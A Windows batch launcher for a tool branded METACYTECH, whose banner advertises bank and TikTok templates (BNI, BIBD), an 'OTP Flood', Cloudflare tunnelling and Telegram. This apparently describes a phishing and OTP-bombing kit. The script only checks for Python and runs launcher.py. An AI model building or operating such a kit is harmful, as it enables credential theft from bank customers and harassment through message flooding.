@echo off
chcp 65001 >nul 2>&1
title METACYTECH - Launcher + OTP Flood
cd /d "%~dp0"

echo.
echo  ============================================================
echo.
echo   ███╗   ███╗ ███████╗ ████████╗ █████╗  ██████╗ ██╗   ██╗ ████████╗ ███████╗ ██████╗  ██╗  ██╗
echo   ████╗ ████║ ██╔════╝ ╚══██╔══╝ ██╔══██╗ ██╔════╝ ╚██╗ ██╔╝ ╚══██╔══╝ ██╔════╝ ██╔════╝  ██║  ██║
echo   ██╔████╔██║ █████╗      ██║    ███████║ ██║       ╚████╔╝     ██║    █████╗   ██║      ███████║
echo   ██║╚██╔╝██║ ██╔══╝      ██║    ██╔══██║ ██║        ╚██╔╝      ██║    ██╔══╝   ██║      ██╔══██║
echo   ██║ ╚═╝ ██║ ███████╗    ██║    ██║  ██║ ╚██████╗    ██║       ██║    ███████╗ ╚██████╗ ██║  ██║
echo   ╚═╝     ╚═╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝  ╚═════╝    ╚═╝       ╚═╝    ╚══════╝  ╚═════╝ ╚═╝  ╚═╝
echo.
echo  ============================================================
echo.
echo    Multi Template: BNI + TikTok + BIBD + OTP Flood
echo    Cloudflare Tunnel  *  Telegram  *  OTP Testing
echo.
echo  ============================================================
echo.

:: Check Python
where python >nul 2>&1
if errorlevel 1 (
    echo  [ERROR] Python tidak ditemukan! Install Python 3.8+
    echo  Download: https://www.python.org/downloads/
    echo.
    pause
    exit /b 1
)

:: Check launcher.py exists
if not exist "launcher.py" (
    echo  [ERROR] launcher.py tidak ditemukan!
    echo  Current dir: %cd%
    echo.
    pause
    exit /b 1
)

:: Run the launcher
echo  Starting METACYTECH launcher...
echo  ============================================================
echo.
python launcher.py

:: If launcher exits with error, show message
if errorlevel 1 (
    echo.
    echo  ============================================================
    echo  [ERROR] Launcher error code: %errorlevel%
    echo  ============================================================
    echo.
)

:: Always pause so the window doesn't close immediately
pause
